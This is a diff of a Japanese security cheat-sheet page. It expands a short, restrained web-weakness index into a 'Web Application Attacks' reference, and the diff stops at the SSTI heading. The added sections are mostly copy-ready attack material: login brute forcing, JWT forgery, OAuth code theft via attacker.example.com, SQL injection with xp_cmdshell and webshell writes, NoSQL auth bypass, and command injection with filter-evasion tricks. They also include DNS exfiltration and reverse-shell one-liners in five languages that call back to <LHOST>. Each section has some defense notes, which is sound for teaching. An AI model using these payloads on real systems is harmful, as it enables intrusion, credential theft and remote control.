@@ -3,8 +3,8 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Web — d0me</title>
-<meta name="description" content="Web 実装の弱点の索引。認証・デシリアライズ・SSTI・ファイルアップロードと、対になる検知/対策。">
+<title>Web Application Attacks — d0me</title>
+<meta name="description" content="Web application attack reference structured by vulnerability class — recon, auth, access control, injection, deserialization, file, SSRF/XXE, client-side, race conditions, and API — with CLI and Burp workflows.">
 <link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -13,140 +13,1112 @@
 </head>
 <body>
 
-<header class="topbar"><div class="wrap">
-  <div class="brand"><span class="glyph">[<b data-handle>d0me</b>]</span><span class="tag">索引</span></div>
-  <button class="nav-toggle" aria-label="メニュー">≡</button>
-  <nav class="nav"><a href="../all.html">索引</a><a href="../index.html#certs">資格</a><a href="#" data-gh-url>github</a></nav>
-</div></header>
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand"><span class="glyph">[<b data-handle>d0me</b>]</span><span class="tag">索引</span></div>
+    <button class="nav-toggle" aria-label="メニュー">≡</button>
+    <nav class="nav"><a href="../all.html">索引</a><a href="../index.html#certs">資格</a><a href="#" data-gh-url>github</a></nav>
+  </div>
+</header>
 
 <main>
-<section class="sheet-hero"><div class="wrap">
-  <div class="crumb"><a href="/" data-blog>blog</a><span class="sep">/</span><a href="../all.html">索引</a><span class="sep">/</span>Web</div>
-  <h1>Web</h1>
-  <p class="lede">Web 実装で頻出する弱点を、発見の観点と定石で整理する。列挙 → 仮説 → 検証の順で、各項目に検知/対策を併記する。
-    <span class="jp">前提: 認可を得た検証対象。ペイロードは一般化した例に留める。</span></p>
-</div></section>
+<section class="sheet-hero">
+  <div class="wrap">
+    <div class="crumb"><a href="/" data-blog>blog</a><span class="sep">/</span><a href="../all.html">索引</a><span class="sep">/</span>Web Application Attacks</div>
+    <h1>Web Application Attacks</h1>
+    <p class="lede">Web application attack reference organized by vulnerability class, from recon through API abuse, with CLI tooling and Burp Suite workflows side by side.<span class="jp">脆弱性クラス軸で整理した Web アプリ攻撃リファレンス。偵察から API 悪用まで、CLI ツールと Burp Suite のワークフローを併記。</span></p>
+  </div>
+</section>
 
-<div class="wrap"><div class="sheet-layout">
+<div class="wrap">
+<div class="sheet-layout">
   <aside class="toc">
     <div class="toc-label">目次</div>
     <ul>
-      <li><a href="#recon">01 列挙 / recon</a></li>
-      <li><a href="#auth">02 認証・セッション</a></li>
-      <li><a href="#deser">03 デシリアライズ</a></li>
-      <li><a href="#ssti">04 SSTI</a></li>
-      <li><a href="#upload">05 アップロード</a></li>
-      <li><a href="#ref">06 参照</a></li>
+      <li><a href="#s1">01 Recon &amp; Mapping</a></li>
+      <li><a href="#s2">02 Authentication</a></li>
+      <li><a href="#s3">03 Access Control</a></li>
+      <li><a href="#s4">04 Injection</a></li>
+      <li><a href="#s5">05 Deserialization</a></li>
+      <li><a href="#s6">06 File &amp; Path</a></li>
+      <li><a href="#s7">07 SSRF &amp; XXE</a></li>
+      <li><a href="#s8">08 Client-side</a></li>
+      <li><a href="#s9">09 Race Conditions</a></li>
+      <li><a href="#s10">10 Config &amp; Design</a></li>
+      <li><a href="#s11">11 API</a></li>
+      <li><a href="#ref">12 References</a></li>
     </ul>
   </aside>
 
   <article class="doc">
-    <section id="recon" class="reveal">
-      <h2><span class="num">01</span>列挙<span class="jp">recon</span></h2>
-      <p>攻撃面はまず「見えている入口」を数える。ディレクトリ・パラメータ・技術スタックを列挙し、フレームワーク特有の弱点へ当たりを付ける。</p>
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># コンテンツ探索</span>
-ffuf -u https://<span class="v">$TARGET</span>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
-gobuster dir -u https://<span class="v">$TARGET</span> -w /usr/share/wordlists/dirb/common.txt</code></pre></div>
+
+    <section id="s1" class="reveal">
+      <h2><span class="num">01</span>Recon &amp; Mapping<span class="jp">偵察・マッピング</span></h2>
+      <p>攻撃対象の技術スタック特定、コンテンツ探索、パラメータ発見。reconnaissance sheet のネットワーク偵察に対し、ここは HTTP レイヤの列挙に特化する。</p>
+
+      <h3>技術スタック特定</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ヘッダ / 技術指紋</span>
+whatweb -a 3 https://target.example.com
+curl -sI https://target.example.com
+nuclei -u https://target.example.com -t http/technologies/
+
+<span class="c"># WAF 検出</span>
+wafw00f https://target.example.com</code></pre></div>
+
+      <h3>コンテンツ探索 (ディレクトリ / ファイル)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ffuf — ディレクトリ / ファイル探索</span>
+ffuf -u https://target.example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,204,301,302,307,401,403
+ffuf -u https://target.example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.bak,.old,.txt,.zip
+
+<span class="c"># 再帰探索 + フィルタ</span>
+ffuf -u https://target.example.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2 -fc 404 -fs 0
+
+<span class="c"># feroxbuster (自動再帰)</span>
+feroxbuster -u https://target.example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt</code></pre></div>
+
+      <h3>vhost / サブドメイン列挙</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># vhost fuzzing (Host ヘッダ)</span>
+ffuf -u https://target.example.com -H "Host: FUZZ.target.example.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
+
+<span class="c"># サブドメイン列挙</span>
+subfinder -d target.example.com -silent | httpx -silent -title -tech-detect</code></pre></div>
+
+      <h3>パラメータ発見</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># arjun — 隠れた HTTP パラメータ発見</span>
+arjun -u "https://target.example.com/api/endpoint" -m GET
+arjun -u "https://target.example.com/api/endpoint" -m POST
+
+<span class="c"># paramspider — アーカイブからパラメータ収集</span>
+paramspider -d target.example.com</code></pre></div>
+
+      <div class="note"><span class="lbl">Burp workflow</span>
+        Proxy → Target → Site map でクロール結果を可視化。Target → Scope に対象を追加し "Show only in-scope items" で絞る。Engagement tools → Discover content でコンテンツ探索、Analyze target で攻撃面把握。Burp の passive scan を有効化しつつ手動でサイトを巡回すると、technology fingerprint と潜在的な脆弱パラメータが自動収集される。
+      </div>
+
       <div class="defense"><span class="lbl">防御 / countermeasures</span>
         <ul>
-          <li>404 の一貫化、レート制限、WAF で総当たり列挙を抑止。</li>
-          <li>技術スタックを露出するヘッダ・エラーページを削減。</li>
+          <li>Server / X-Powered-By / X-AspNet-Version 等の technology-disclosure ヘッダを削除</li>
+          <li>ディレクトリリスティングを無効化、機密ファイル (.git / .env / backup) を web root 外へ</li>
+          <li>WAF (ModSecurity + OWASP CRS) で discovery scan の高頻度リクエストを rate-limit</li>
+          <li>不要なエンドポイント / デバッグインターフェースを本番から除去</li>
         </ul>
       </div>
-    </section>
 
-    <section id="auth" class="reveal">
-      <h2><span class="num">02</span>認証・セッション<span class="jp">auth</span></h2>
-      <p>弱点は「資格情報の推測可能性」と「セッションの検証不備」に集約される。JWT は署名検証(alg=none・弱鍵)、Cookie は属性(HttpOnly/SameSite/Secure)を確認する。</p>
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ログイン総当たり（許可された範囲で）</span>
-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
-  <span class="v">$TARGET</span> https-post-form \
-  "/login:user=^USER^&pass=^PASS^:F=invalid"
-
-<span class="c"># Flask セッション（弱い SECRET_KEY の検証）</span>
-flask-unsign --unsign --cookie '&lt;COOKIE&gt;' --wordlist /usr/share/wordlists/rockyou.txt</code></pre></div>
-      <div class="defense"><span class="lbl">防御 / countermeasures</span>
-        <ul>
-          <li>強固なランダム鍵、署名アルゴリズム固定、MFA、ロックアウト/レート制限。</li>
-          <li>Cookie に HttpOnly・SameSite・Secure を付与し、失敗ログを監視。</li>
-        </ul>
-      </div>
-    </section>
-
-    <section id="deser" class="reveal">
-      <h2><span class="num">03</span>デシリアライズ<span class="jp">deserialization</span></h2>
-      <p>信頼できない入力をオブジェクト復元に渡すと、ガジェットチェーン経由で任意コード実行に至る。言語・ライブラリで成立条件が異なるため、まずシリアライズ形式(Java/PHP/.NET/Python pickle 等)を同定する。</p>
-      <ul>
-        <li><strong>同定</strong> — Base64 のマジックバイト(Java <code>rO0</code>、.NET <code>AAEAAAD</code> 等)や Cookie/パラメータ形状から推定。</li>
-        <li><strong>検証</strong> — 公開ガジェット生成器(ysoserial 系)で既知チェーンの成立可否を確認。</li>
-      </ul>
-      <div class="note warn"><span class="lbl">注意</span>ガジェットチェーンの実装詳細は載せない。成立条件の同定と、対策側の観点に留める。</div>
-      <div class="defense"><span class="lbl">防御 / countermeasures</span>
-        <ul>
-          <li>信頼境界を越えるデータをネイティブ・デシリアライズに渡さない(JSON+スキーマ検証へ)。</li>
-          <li>許可型リスト(look-ahead deserialization)、ライブラリ更新、実行監視。</li>
-        </ul>
-      </div>
-    </section>
-
-    <section id="ssti" class="reveal">
-      <h2><span class="num">04</span>SSTI<span class="jp">template injection</span></h2>
-      <p>ユーザ入力がテンプレートエンジンに評価されると、式評価から RCE に発展し得る。まずポリグロットで反応を見てエンジンを同定する。</p>
-      <div class="code"><div class="code-bar"><span class="code-lang">text</span><button class="copy">copy</button></div><pre><code><span class="c"># 反応検知用ポリグロット（評価されるか）</span>
-${7*7}  {{7*7}}  &lt;%= 7*7 %&gt;  #{7*7}
-<span class="c"># 49 が返ればテンプレート評価あり → エンジン同定へ</span></code></pre></div>
-      <div class="defense"><span class="lbl">防御 / countermeasures</span>
-        <ul>
-          <li>ユーザ入力をテンプレートに連結しない。ロジックレス/サンドボックス化エンジンを使う。</li>
-          <li>出力エスケープと、テンプレート評価の監査ログ。</li>
-        </ul>
-      </div>
-    </section>
-
-    <section id="upload" class="reveal">
-      <h2><span class="num">05</span>アップロード<span class="jp">file upload</span></h2>
-      <p>検証不備は拡張子・Content-Type・マジックバイト・保存先の実行可否の組合せで生じる。狙いは「実行可能な場所に、実行される形式で置けるか」。</p>
-      <table>
-        <thead><tr><th>検証</th><th>典型的な不備</th></tr></thead>
-        <tbody>
-          <tr><td>拡張子</td><td>ブラックリスト漏れ(代替拡張子・大文字・二重拡張子)</td></tr>
-          <tr><td>Content-Type</td><td>クライアント申告を信頼</td></tr>
-          <tr><td>内容検査</td><td>マジックバイト偽装を未検出</td></tr>
-          <tr><td>保存先</td><td>Web ルート配下で実行可能</td></tr>
-        </tbody>
-      </table>
-      <div class="defense"><span class="lbl">防御 / countermeasures</span>
-        <ul>
-          <li>許可型リスト検証 + サーバ側でのマジックバイト確認、ランダム名で保存。</li>
-          <li>保存先を Web ルート外・実行不可に。画像は再エンコードして無害化。</li>
-        </ul>
-      </div>
       <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
         <ul>
-          <li>Web は「入口を数える → 技術スタックを同定 → 定石で検証」。列挙が精度を決める。</li>
-          <li>認証は鍵と署名検証、セッションは属性。デシリアライズ/SSTI はまず形式・エンジンの同定が先。</li>
-          <li>アップロードは単一検証では守れない。拡張子・内容・保存先の実行可否を多層で断つ。</li>
+          <li>recon は「技術特定 → コンテンツ探索 → パラメータ発見」の順で攻撃面を段階的に展開</li>
+          <li>ffuf の filter (-fc / -fs / -fw) と matcher (-mc) を使い分け、レスポンスサイズ / ステータスで noise を除去</li>
+          <li>vhost fuzzing は同一 IP 上の非公開アプリを発見する、DNS 列挙と補完関係</li>
+          <li>Burp Target scope の設定は誤爆防止と後続の全ツール連携の起点</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s2" class="reveal">
+      <h2><span class="num">02</span>Authentication<span class="jp">認証</span></h2>
+      <p>ログイン機構・トークン・SSO の設計不備を突く。JWT / OAuth / SAML は現代 Web アプリの認証中核で、それぞれ固有の攻撃面を持つ。</p>
+
+      <h3>ログイン攻撃 (bruteforce / user enum)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ffuf — POST ログインブルートフォース</span>
+ffuf -u https://target.example.com/login -X POST \
+  -d "username=admin&amp;password=FUZZ" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -w /usr/share/seclists/Passwords/rockyou.txt \
+  -fr "Invalid credentials"
+
+<span class="c"># hydra — HTTP POST form</span>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt target.example.com \
+  http-post-form "/login:username=^USER^&amp;password=^PASS^:Invalid credentials"
+
+<span class="c"># ユーザ列挙 (レスポンス差分 / タイミング)</span>
+ffuf -u https://target.example.com/login -X POST \
+  -d "username=FUZZ&amp;password=test" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+  -fr "Invalid username"</code></pre></div>
+
+      <h3>JWT 攻撃</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># jwt_tool — 解析 + 脆弱性スキャン</span>
+jwt_tool eyJhbGci...
+jwt_tool eyJhbGci... -M pb            <span class="c"># playbook スキャン</span>
+
+<span class="c"># alg:none 改竄</span>
+jwt_tool eyJhbGci... -X a
+
+<span class="c"># HS256 鍵ブルートフォース (弱い secret)</span>
+jwt_tool eyJhbGci... -C -d /usr/share/wordlists/rockyou.txt
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+
+<span class="c"># RS256 → HS256 confusion (公開鍵を HMAC 鍵に転用)</span>
+jwt_tool eyJhbGci... -X k -pk public.pem
+
+<span class="c"># kid injection (SQLi / path traversal / command)</span>
+jwt_tool eyJhbGci... -I -hc kid -hv "../../dev/null"</code></pre></div>
+
+      <div class="note"><span class="lbl">JWT 攻撃の判断順序</span>
+        <ul>
+          <li><b>alg:none</b> — 署名検証がアルゴリズム名を信頼している場合に成立</li>
+          <li><b>weak HMAC secret</b> — HS256 で辞書に載る secret を使用している場合</li>
+          <li><b>alg confusion (RS256→HS256)</b> — 検証側が公開鍵を HMAC secret として扱う実装ミス</li>
+          <li><b>kid injection</b> — kid ヘッダがファイル読込 / SQL クエリに渡される場合</li>
+          <li><b>jku / x5u SSRF</b> — 鍵取得 URL を攻撃者サーバに向ける</li>
+        </ul>
+      </div>
+
+      <h3>OAuth 2.0 / OIDC</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">http</span><button class="copy">copy</button></div><pre><code><span class="c"># redirect_uri 検証不備 — 認可コード奪取</span>
+GET /authorize?client_id=xxx&amp;redirect_uri=https://attacker.example.com&amp;response_type=code&amp;scope=openid HTTP/1.1
+
+<span class="c"># redirect_uri の path traversal / サブドメイン許容の悪用</span>
+redirect_uri=https://target.example.com.attacker.example.com
+redirect_uri=https://target.example.com/callback/../redirect?url=attacker
+
+<span class="c"># state パラメータ欠如 → CSRF (アカウント連携の乗っ取り)</span>
+<span class="c"># response_type=token (implicit) のトークン漏洩</span></code></pre></div>
+
+      <h3>SAML</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># SAMLResponse の解析 / 改竄 (Burp SAML Raider 拡張が主軸)</span>
+echo "SAMLResponse..." | base64 -d | xmllint --format -
+
+<span class="c"># XML Signature Wrapping (XSW) — 署名済み要素の外に改竄要素を注入</span>
+<span class="c"># signature exclusion — Signature 要素ごと削除して検証回避</span>
+<span class="c"># comment injection — user@example.com<!---->.attacker.example.com で NameID を分断</span></code></pre></div>
+
+      <div class="note"><span class="lbl">Burp workflow</span>
+        認証系は Burp が主戦場。JWT は <b>JWT Editor</b> 拡張で alg 改竄・鍵注入をリアルタイムに。SAML は <b>SAML Raider</b> で XSW / signature exclusion を GUI 操作。OAuth の redirect_uri テストは Repeater で response_type / redirect_uri を差し替え、Intruder でパラメータ pollution を総当たり。ログインブルートフォースは Intruder (Sniper / Cluster bomb) だが、無料版はレート制限があるため CLI ツール併用が現実的。
+      </div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>JWT は署名アルゴリズムをサーバ側で固定 (alg ヘッダを信頼しない)、HS256 secret は 256bit 以上のランダム値</li>
+          <li>OAuth の redirect_uri は完全一致 (exact match) で検証、state パラメータを必須化</li>
+          <li>SAML は署名検証を XML 全体に適用、XSW 対策として署名対象要素を厳格に参照</li>
+          <li>ログイン試行のレート制限 + アカウントロックアウト、ユーザ列挙防止のため成功/失敗レスポンスを一定化</li>
+          <li>多要素認証 (MFA) の導入、セッショントークンの再生成 (ログイン時 fixation 対策)</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>JWT は alg:none → weak secret → alg confusion → kid injection の順で試すのが効率的</li>
+          <li>OAuth の脆弱性は redirect_uri 検証不備と state 欠如が二大経路、アカウント乗っ取りに直結</li>
+          <li>SAML は XSW が中核、SAML Raider なしでの手動改竄は非効率</li>
+          <li>認証系は Burp 拡張 (JWT Editor / SAML Raider) の習熟が実務効率を大きく左右する</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s3" class="reveal">
+      <h2><span class="num">03</span>Access Control<span class="jp">アクセス制御</span></h2>
+      <p>認証済みユーザが権限外のリソース / 機能にアクセスできる不備。IDOR と権限昇格が中核で、水平 (他ユーザのデータ) と垂直 (上位権限機能) の両方向を検証する。</p>
+
+      <h3>IDOR (Insecure Direct Object Reference)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 数値 ID の総当たり (他ユーザリソースへの水平アクセス)</span>
+ffuf -u "https://target.example.com/api/user/FUZZ/profile" \
+  -H "Authorization: Bearer &lt;TOKEN&gt;" \
+  -w &lt;(seq 1 10000) -mc 200 -fr "Access denied"
+
+<span class="c"># UUID / ハッシュ ID の漏洩元探索 (他エンドポイントからの ID 収集)</span>
+<span class="c"># 予測可能な ID (base64 / MD5 / 連番) のデコード</span>
+echo "MTAwMQ==" | base64 -d    <span class="c"># → 1001</span></code></pre></div>
+
+      <h3>権限昇格 (垂直)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">http</span><button class="copy">copy</button></div><pre><code><span class="c"># 管理者機能への forced browsing</span>
+GET /admin/deleteUser?id=5 HTTP/1.1
+
+<span class="c"># パラメータベースの権限操作 (mass assignment)</span>
+POST /api/user/update HTTP/1.1
+{"username":"attacker","role":"admin","isAdmin":true}
+
+<span class="c"># HTTP メソッド切替 (GET 制限を PUT / DELETE で回避)</span>
+<span class="c"># X-Original-URL / X-Rewrite-URL によるパス制限回避</span>
+GET /index HTTP/1.1
+X-Original-URL: /admin/config</code></pre></div>
+
+      <div class="note"><span class="lbl">Burp workflow</span>
+        アクセス制御は <b>Autorize</b> 拡張が決定版。低権限ユーザの Cookie / トークンを Autorize に登録し、高権限セッションで巡回すると、各リクエストを低権限で再送して "Bypassed! / Enforced!" を自動判定する。IDOR は Repeater で ID を差し替えつつ、Intruder (Sniper) で連番 / UUID リストを総当たり。Match and Replace ルールでセッショントークンを常時差し替える運用も有効。
+      </div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>オブジェクトアクセスごとに所有者検証 (session user == resource owner) をサーバ側で強制</li>
+          <li>直接参照を避け、セッションに紐づく間接参照 (indirect reference map) を使用</li>
+          <li>権限チェックを deny-by-default で実装、機能単位で明示的に許可</li>
+          <li>mass assignment 対策として、受入フィールドを allowlist で限定 (role / isAdmin を bind しない)</li>
+          <li>X-Original-URL / X-Rewrite-URL 等のヘッダを信頼しない、URL 正規化を統一</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>IDOR は水平 (他ユーザデータ) と垂直 (上位権限) の両方向を検証、ID の予測可能性が鍵</li>
+          <li>mass assignment は role / isAdmin 等の特権フィールドを JSON に注入して検証</li>
+          <li>Autorize 拡張は 2 セッション比較でアクセス制御不備を半自動検出、実務効率が高い</li>
+          <li>ヘッダベースのパス制限回避 (X-Original-URL) は逆プロキシ構成で頻出</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s4" class="reveal">
+      <h2><span class="num">04</span>Injection<span class="jp">インジェクション</span></h2>
+      <p>ユーザ入力がインタプリタ (SQL / OS shell / テンプレートエンジン / LDAP) にコンテキスト分離なく渡る不備。攻撃面が広く、web アプリ侵害の最頻経路。</p>
+
+      <h3>SQL Injection</h3>
+      <div class="note"><span class="lbl">UNION-based の基本手順</span>
+        <ul>
+          <li>(1) 脆弱性確認 — 単一引用符 <code>'</code> でエラー誘発</li>
+          <li>(2) カラム数特定 — <code>ORDER BY N</code> を増やしてエラー境界を探る、または <code>UNION SELECT NULL,NULL,...</code></li>
+          <li>(3) DB 名特定 — <code>database()</code> / <code>@@version</code> で DBMS と DB を確認</li>
+          <li>(4) テーブル / カラム列挙 — <code>information_schema.tables</code> / <code>information_schema.columns</code></li>
+          <li>(5) データ抽出 — 対象テーブルから認証情報等を取得</li>
+        </ul>
+      </div>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 手動検出 — エラーベース / boolean / time-based</span>
+' OR '1'='1
+' UNION SELECT NULL,NULL,NULL-- -
+'; WAITFOR DELAY '0:0:5'-- -            <span class="c"># MSSQL time-based</span>
+' AND SLEEP(5)-- -                      <span class="c"># MySQL time-based</span>
+
+<span class="c"># sqlmap — 自動化</span>
+sqlmap -u "https://target.example.com/item?id=1" --batch --dbs
+sqlmap -r request.txt --batch --level 5 --risk 3 --dbs      <span class="c"># Burp 保存リクエストから</span>
+sqlmap -u "..." --dbms=mysql -D appdb -T users --dump
+
+<span class="c"># WAF 回避 tamper</span>
+sqlmap -u "..." --tamper=space2comment,between,charencode --random-agent
+
+<span class="c"># 権限がある場合の発展 (RCE / ファイル操作)</span>
+sqlmap -u "..." --os-shell                             <span class="c"># インタラクティブ OS shell (要 stacked query / FILE 権限)</span>
+sqlmap -u "..." --file-write local.txt --file-dest "/var/www/html/shell.php"
+sqlmap -u "..." --file-read "/etc/passwd"</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sql</span><button class="copy">copy</button></div><pre><code><span class="c">-- UNION-based データ抽出 (カラム数特定後)</span>
+' UNION SELECT username,password FROM users-- -
+
+<span class="c">-- DB 種別特定</span>
+' UNION SELECT @@version,NULL-- -          <span class="c"># MySQL/MSSQL</span>
+' UNION SELECT version(),NULL-- -          <span class="c"># PostgreSQL</span>
+' UNION SELECT banner,NULL FROM v$version-- -   <span class="c"># Oracle</span>
+
+<span class="c">-- テーブル / カラム列挙 (information_schema)</span>
+' UNION SELECT table_name,NULL FROM information_schema.tables-- -
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT table_name,column_name FROM information_schema.columns-- -
+
+<span class="c">-- RCE (権限次第)</span>
+'; EXEC xp_cmdshell 'whoami'-- -           <span class="c"># MSSQL</span>
+' INTO OUTFILE '/var/www/html/shell.php'-- -    <span class="c"># MySQL file write</span></code></pre></div>
+
+      <div class="note"><span class="lbl">文字列 / 関数コンテキストの脱出</span>
+        <ul>
+          <li>クエリが <code>LOWER(name)='input'</code> のように関数で包む場合、文字列だけでなく関数の閉じ括弧 <code>)</code> も補う: <code>foo') OR id=11-- -</code></li>
+          <li><code>LIKE '%input%'</code> の場合は末尾の <code>%')</code> も閉じる: <code>%foo') OR id=11-- %</code></li>
+          <li><code>ORDER BY N</code> を増やしてエラー境界からカラム数を特定 (UNION の前段)</li>
+          <li>大小文字を区別する DB では <code>UPPER()</code>/<code>LOWER()</code> でフィルタ回避も併用</li>
+        </ul>
+      </div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sql</span><button class="copy">copy</button></div><pre><code><span class="c">-- DBMS 別の列挙 (current_user / データベース一覧)</span>
+<span class="c">-- MySQL / MariaDB</span>
+SELECT current_user();  SELECT table_schema FROM information_schema.tables GROUP BY table_schema;
+SELECT table_name FROM information_schema.tables WHERE table_schema='appdb';
+
+<span class="c">-- MSSQL</span>
+SELECT SYSTEM_USER;  SELECT name FROM sys.databases;
+SELECT * FROM appdb.information_schema.tables;
+
+<span class="c">-- PostgreSQL</span>
+SELECT current_user;  SELECT datname FROM pg_database;
+SELECT table_name FROM appdb.information_schema.tables WHERE table_schema='public';
+
+<span class="c">-- Oracle (DUAL / all_tables、スキーマ = ユーザ)</span>
+SELECT user FROM dual;  SELECT owner FROM all_tables GROUP BY owner;
+SELECT table_name FROM all_tables WHERE owner='SYSTEM';</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sql</span><button class="copy">copy</button></div><pre><code><span class="c">-- ファイル読み書き (DBMS 別)</span>
+<span class="c">-- MySQL: secure_file_priv が許可パスを制限</span>
+SELECT @@GLOBAL.secure_file_priv;
+SELECT LOAD_FILE('/etc/passwd');
+SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/out.txt';
+
+<span class="c">-- PostgreSQL: COPY / pg_read_file()</span>
+CREATE TABLE tmp(data text); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp;
+SELECT pg_read_file('/etc/passwd');
+COPY tmp TO '/var/www/html/shell.php';    <span class="c"># webshell 書込</span>
+
+<span class="c">-- MSSQL: xp_cmdshell 有効化 → RCE</span>
+EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;
+EXECUTE xp_cmdshell 'whoami';</code></pre></div>
+
+      <div class="note"><span class="lbl">エラーベース抽出のヒント</span>
+        <ul>
+          <li>MySQL: <code>extractvalue('',concat('&gt;',version()))</code> / <code>cast(version() as int)</code></li>
+          <li>MSSQL / PostgreSQL: <code>cast(@@version as int)</code> / <code>cast(version() as int)</code> の型変換エラーに値を載せる</li>
+          <li>Oracle: <code>dbms_xmlgen.getxml()</code>、Oracle/PostgreSQL は <code>||</code> で文字列連結</li>
+          <li>スタッククエリ (<code>;</code> 区切り) は PostgreSQL 等で INSERT/UPDATE を注入可能</li>
+        </ul>
+      </div>
+
+      <h3>NoSQL Injection</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 認証バイパス (MongoDB operator injection)</span>
+username[$ne]=null&amp;password[$ne]=null
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": "admin", "password": {"$regex": "^a"}}    <span class="c"># ブラインド抽出</span>
+
+<span class="c"># nosqlmap / 手動 JSON operator</span>
+{"$where": "sleep(5000)"}    <span class="c"># time-based</span></code></pre></div>
+
+      <h3>Command Injection</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 区切り文字での連結</span>
+; id
+| id
+|| id
+&amp;&amp; id
+$(id)
+`id`
+
+<span class="c"># OOB / blind (時間 / DNS)</span>
+; sleep 10
+&amp; nslookup $(whoami).attacker.example.com
+
+<span class="c"># フィルタ回避</span>
+;i''d
+;i\d
+;cat${IFS}/etc/passwd    <span class="c"># スペースフィルタ回避</span>
+;wh$()oami               <span class="c"># 空の command substitution で blocklist 文字列を分断</span>
+;n$()c -nvlp 4444</code></pre></div>
+
+      <div class="note"><span class="lbl">正規化・sanitize の突破</span>
+        <ul>
+          <li>URL 内の <code>&amp;</code> は別パラメータと解釈される。<code>bash -c '...'</code> でラップして 1 パラメータに収める</li>
+          <li>blocklist は「指令」でなく「文字列」を弾く。<code>wh$()oami</code> のように shell では解釈されるが filter には別文字列に見える形で分断</li>
+          <li>危険文字列 (etc / passwd / バッククォート) は base64 で回避: <code>;`echo Y2F0IC9ldGMvcGFzc3dk|base64 -d`</code></li>
+          <li>base64 バイナリが無ければ openssl で代替: <code>echo ... | openssl base64 -d</code> (ほぼ全 Linux に存在)</li>
+        </ul>
+      </div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># reverse shell 取得 (言語別、注入先の実行環境に合わせる)</span>
+<span class="c"># bash</span>
+bash -c 'bash -i >&amp; /dev/tcp/&lt;LHOST&gt;/4444 0>&amp;1'
+<span class="c"># python</span>
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("&lt;LHOST&gt;",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
+<span class="c"># php</span>
+php -r '$s=fsockopen("&lt;LHOST&gt;",4444);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");'
+<span class="c"># perl</span>
+perl -e 'use Socket;$i="&lt;LHOST&gt;";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");'
+<span class="c"># node.js</span>
+require('child_process').spawnSync('/bin/sh',['-c','bash -i >&amp; /dev/tcp/&lt;LHOST&gt;/4444 0>&amp;1'])</code></pre></div>
+
+      <h3>SSTI (Server-Side Template Injection)</h3>
